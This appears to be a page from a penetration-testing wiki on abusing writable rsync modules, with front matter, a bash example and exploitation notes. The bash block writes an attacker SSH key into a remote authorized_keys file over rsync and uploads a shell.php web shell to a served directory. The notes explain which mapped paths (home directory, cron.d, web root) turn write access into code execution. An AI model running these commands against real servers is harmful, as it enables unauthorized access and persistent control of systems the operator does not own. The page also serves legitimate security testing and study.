---
title: "Write access: uploading to a writable rsync module for execution"
description: "Abusing a writable rsync module to upload files to sensitive locations, planting an SSH authorized_keys file, a cron job, or a web shell where the module maps onto an executable path, turning write access into code execution on the server."
keywords:
  - rsync write
  - authorized_keys
  - cron
  - web shell
  - code execution
---

# Write access

A module without `read only = yes` accepts uploads. Where that module maps onto a sensitive path on the server (a home directory, cron directory, or web root), uploading the right file turns write access into execution: an `authorized_keys` for SSH, a job in `cron.d`, or a web shell under a served directory.

```bash
# Upload an SSH key to a writable home-directory module
echo 'ssh-ed25519 AAAA... attacker' > authorized_keys
rsync -av authorized_keys rsync://<target>/home/user/.ssh/authorized_keys
# Or drop a cron job / web shell where the module maps to one
rsync -av shell.php rsync://<target>/www/uploads/
```

## Exploitation notes

- The payoff depends on where the module points: a home dir enables SSH key injection, `cron.d` scheduled execution, a web root a web shell.
- The daemon's run user determines file ownership; a root-run rsyncd writing to system paths is the strongest case.
- Combine with [Module enumeration](module-enumeration.md) to pick the module whose path yields execution.

## References

- [HackTricks: pentesting rsync](https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html)
- [rsync manual](https://download.samba.org/pub/rsync/rsync.1)
